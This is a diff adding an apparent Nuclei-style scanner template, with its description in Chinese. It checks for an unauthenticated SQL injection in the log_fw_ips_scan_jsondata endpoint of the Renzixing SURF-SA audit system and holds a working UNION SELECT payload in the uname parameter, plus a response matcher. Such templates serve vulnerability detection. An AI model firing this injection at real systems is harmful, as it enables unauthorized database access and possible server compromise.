@@ -1,0 +1,18 @@
+id: rzh-uname-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 任子行网络安全审计系统SURF-SA系列产品是任子行为各行业提供的自主可控信息化办公环境上网行为审计的安全服务。任子行网络安全审计系统 log_fw_ips_scan_jsondata 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%BB%BB%E5%AD%90%E8%A1%8C/%E4%BB%BB%E5%AD%90%E8%A1%8C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Flog_fw_ips_scan_jsondata%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webui/?g=log_fw_ips_scan_jsondata&uname='+union+select+sqlite_version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "3.7.7"
